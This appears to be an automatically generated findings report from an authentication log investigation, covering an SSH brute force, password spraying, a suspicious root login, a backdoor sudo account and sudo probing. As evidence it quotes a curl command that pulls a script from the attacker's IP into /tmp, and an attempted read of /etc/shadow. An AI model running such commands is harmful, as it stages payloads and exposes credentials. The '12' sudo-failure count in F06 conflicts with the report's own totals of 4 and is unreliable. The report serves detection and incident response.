# Authentication Log Investigation — Findings

**Source log:** `data/auth.log`  
**Events parsed:** 135  
**Time range:** 2026-09-13 22:16:00 → 2026-09-14 11:11:00  
**Findings:** 10 (CRITICAL: 2, HIGH: 5, MEDIUM: 3)

## Event mix

| Type | Count |
|---|---|
| ssh_fail | 55 |
| ssh_ok | 26 |
| ssh_invalid_user | 24 |
| other | 20 |
| sudo_fail | 4 |
| sudo_ok | 3 |
| useradd | 1 |
| usermod | 1 |
| su_attempt | 1 |

## Top source IPs

| IP | Events |
|---|---|
| 203.0.113.45 | 46 |
| 198.51.100.77 | 32 |
| 192.0.2.14 | 5 |
| 192.0.2.44 | 2 |
| 192.0.2.32 | 2 |

## Findings

| ID | Severity | Title | Source | Users | Events | First seen | Last seen | ATT&CK |
|---|---|---|---|---|---|---|---|---|
| F03 | **CRITICAL** | Successful login after failure burst (likely compromised credential) | `203.0.113.45` | admin, root | 38 | 00:05:01 | 00:06:42 | T1078 Valid Accounts |
| F10 | **CRITICAL** | Account added to privileged group | `local` | svc_backup | 1 | 00:09:02 | 00:09:02 | T1098 Account Manipulation |
| F01 | **HIGH** | SSH brute force (many failures from one source) | `203.0.113.45` | admin, root | 37 | 00:05:01 | 00:06:39 | T1110.001 Password Guessing |
| F09 | **HIGH** | New local account created | `local` | svc_backup | 1 | 00:08:42 | 00:08:42 | T1136.001 Create Account: Local |
| F08 | **HIGH** | Privileged command fetched/staged a remote payload | `local` | root | 1 | 00:09:42 | 00:09:42 | T1105 Ingress Tool Transfer |
| F02 | **HIGH** | Password spraying (one source, many accounts) | `198.51.100.77` | alice, bob, carol, dave… | 16 | 01:40:33 | 01:49:19 | T1110.003 Password Spraying |
| F06 | **HIGH** | Repeated failed sudo (local privilege-escalation probing) | `local` | arjun | 4 | 09:00:15 | 09:01:00 | T1548.003 Sudo and Sudo Caching |
| F04 | **MEDIUM** | Privileged account login outside business hours | `203.0.113.45` | root | 1 | 00:06:42 | 00:06:42 | T1078 Valid Accounts |
| F05 | **MEDIUM** | Username enumeration / invalid-user probing | `198.51.100.77` | alice, bob, carol, dave… | 16 | 01:40:33 | 01:49:19 | T1087 Account Discovery |
| F07 | **MEDIUM** | su to root attempted | `local` | arjun | 1 | 09:30:00 | 09:30:00 | T1548 Abuse Elevation Control Mechanism |

### F03 · CRITICAL · Successful login after failure burst (likely compromised credential)

'root' accepted via password from 203.0.113.45 after 37 failures in the preceding 10 min. Treat the account and host as compromised until proven otherwise.

- Source: `203.0.113.45` · Users: admin, root
- Evidence lines in log: 27, 28, 29, 30, 31, 33, 34, 35, 36, 37, 39, 40, 41, 42, 43…

### F10 · CRITICAL · Account added to privileged group

'svc_backup' added to 'sudo' — backdoor admin pattern.

- Source: `local` · Users: svc_backup
- Evidence lines in log: 74

### F01 · HIGH · SSH brute force (many failures from one source)

37 failed passwords in 1.6 min (22.7/min); primary target 'root' (29 attempts).

- Source: `203.0.113.45` · Users: admin, root
- Evidence lines in log: 27, 28, 29, 30, 31, 33, 34, 35, 36, 37, 39, 40, 41, 42, 43…

### F09 · HIGH · New local account created

Account 'svc_backup' created — verify against change tickets.

- Source: `local` · Users: svc_backup
- Evidence lines in log: 73

### F08 · HIGH · Privileged command fetched/staged a remote payload

'root' ran as root: /usr/bin/curl -s http://203.0.113.45/x.sh -o /tmp/x.sh

- Source: `local` · Users: root
- Evidence lines in log: 75

### F02 · HIGH · Password spraying (one source, many accounts)

16 failures across 16 distinct usernames, max 1 attempt(s) per user — the signature of spraying a single password against a user list to stay under lockout thresholds.

- Source: `198.51.100.77` · Users: alice, bob, carol, dave, erin, frank, grace, heidi, ivan, judy, mallory, oscar, peggy, trent, victor, walter
- Evidence lines in log: 88, 90, 92, 94, 96, 98, 100, 102, 104, 108, 110, 112, 114, 116, 118…

### F06 · HIGH · Repeated failed sudo (local privilege-escalation probing)

'arjun' failed sudo 12 times; last command attempted: /bin/cat /etc/shadow

- Source: `local` · Users: arjun
- Evidence lines in log: 124, 125, 126, 127

### F04 · MEDIUM · Privileged account login outside business hours

'root' logged in at 00:06 (allowed window 08:00–20:00).

- Source: `203.0.113.45` · Users: root
- Evidence lines in log: 71

### F05 · MEDIUM · Username enumeration / invalid-user probing

16 non-existent usernames tried: alice, bob, carol, dave, erin, frank, grace, heidi….

- Source: `198.51.100.77` · Users: alice, bob, carol, dave, erin, frank, grace, heidi, ivan, judy, mallory, oscar, peggy, trent, victor, walter
- Evidence lines in log: 87, 89, 91, 93, 95, 97, 99, 101, 103, 107, 109, 111, 113, 115, 117…

### F07 · MEDIUM · su to root attempted

'arjun' attempted 'su root' on pts/1.

- Source: `local` · Users: arjun
- Evidence lines in log: 128
